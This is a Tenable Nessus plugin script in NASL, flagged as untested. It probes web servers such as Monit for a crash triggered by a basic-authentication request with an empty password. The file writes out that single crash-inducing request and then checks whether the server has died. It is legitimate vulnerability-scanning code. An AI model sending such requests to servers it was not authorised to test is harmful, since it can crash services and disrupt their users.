#
# (C) Tenable Network Security, Inc.
#
# *untested*
#
# Affected:
# Monit
# 



include("compat.inc");

if(description)
{
 script_id(12200);
 script_version ("$Revision: 1.9 $");

 script_name(english:"Web Server Incomplete Basic Authentication DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid basic
authentication request.

A remote attacker may exploit this vulnerability to make the web server
crash continually or even execute arbitrary code." );
 script_set_attribute(attribute:"solution", value:
"Upgrade the web server to the latest version or protect it with a
filtering reverse proxy." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Basic authentication without password chokes the web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

####
include("global_settings.inc");
include ("misc_func.inc");
include ("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(port: port, method: "GET", item: "/", username: "XXXX", password: "");

if (http_is_dead(port: port, retry: 3)) security_hole(port);

 
